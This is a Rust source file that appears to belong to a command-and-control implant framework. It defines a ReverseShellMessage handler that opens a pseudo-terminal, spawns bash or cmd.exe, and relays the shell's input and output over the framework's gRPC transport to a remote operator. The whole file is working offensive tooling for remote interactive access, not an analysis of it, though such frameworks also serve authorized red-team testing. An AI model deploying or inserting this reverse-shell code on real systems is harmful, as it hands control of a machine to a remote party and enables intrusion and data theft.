use super::Dispatcher;
use anyhow::Result;
use pb::c2::{ReverseShellRequest, ReverseShellResponse};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use std::sync::mpsc::channel;
use transport::Transport;

/*
 * ReverseShellMessage will open a reverse shell when dispatched.
 */
#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ReverseShellMessage {
    pub(crate) id: i64,
    // pub(crate) name: String,
    // pub(crate) tx: Sender<FetchAssetResponse>,
}

impl Dispatcher for ReverseShellMessage {
    async fn dispatch(self, transport: &mut impl Transport) -> Result<()> {
        #[cfg(debug_assertions)]
        log::info!("starting reverse shell");

        let (input_tx, input_rx) = channel::<ReverseShellResponse>();
        let (output_tx, output_rx) = channel::<ReverseShellRequest>();
        let task_id = self.id;

        // Queue an initial message
        output_tx.send(ReverseShellRequest {
            task_id,
            data: b"Welcome!\n".to_vec(),
        })?;

        // Use the native pty implementation for the system
        let pty_system = native_pty_system();

        // Create a new pty
        let pair = pty_system.openpty(PtySize {
            rows: 24,
            cols: 80,
            // TODO: What it do?
            pixel_width: 0,
            pixel_height: 0,
        })?;

        // Spawn a shell into the pty
        #[cfg(not(target = "windows"))]
        let cmd = CommandBuilder::new("bash");
        #[cfg(target = "windows")]
        let cmd = CommandBuilder::new("cmd.exe");

        let _child = pair.slave.spawn_command(cmd)?;

        let mut reader = pair.master.try_clone_reader()?;
        let mut writer = pair.master.take_writer()?;

        const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
        let read_handle = tokio::spawn(async move {
            let mut result = move || -> Result<()> {
                #[cfg(debug_assertions)]
                log::info!("started reverse shell read handler");

                loop {
                    let mut buffer = [0; CHUNK_SIZE];
                    let n = reader.read(&mut buffer[..])?;

                    #[cfg(debug_assertions)]
                    log::info!(
                        "reporting shell output (task_id={}, size={})",
                        task_id,
                        buffer.len()
                    );

                    output_tx.send(ReverseShellRequest {
                        task_id,
                        data: buffer[..n].to_vec(),
                    })?;

                    if n < 1 {
                        break Ok(());
                    }
                }
            };
            match result() {
                Ok(_) => {
                    #[cfg(debug_assertions)]
                    log::info!("closed reverse shell read handler");
                }
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to read from shell: {}", _err);
                }
            }
        });

        let write_handle = tokio::spawn(async move {
            #[cfg(debug_assertions)]
            log::info!("started reverse shell write handler");

            let mut result = move || -> Result<()> {
                for msg in input_rx {
                    writer.write_all(&msg.data)?;
                }
                Ok(())
            };
            match result() {
                Ok(_) => {
                    #[cfg(debug_assertions)]
                    log::info!("closed reverse shell write handler");
                }
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to write to shell: {}", _err);
                }
            }
        });

        #[cfg(debug_assertions)]
        log::info!("started reverse shell gRPC stream");

        transport.reverse_shell(output_rx, input_tx).await?;

        #[cfg(debug_assertions)]
        log::info!("finished reverse shell gRPC stream");

        write_handle.await?;
        read_handle.await?;

        #[cfg(debug_assertions)]
        log::info!("closed reverse shell");

        Ok(())
    }
}

#[cfg(debug_assertions)]
impl PartialEq for ReverseShellMessage {
    fn eq(&self, other: &Self) -> bool {
        self.id == other.id
    }
}
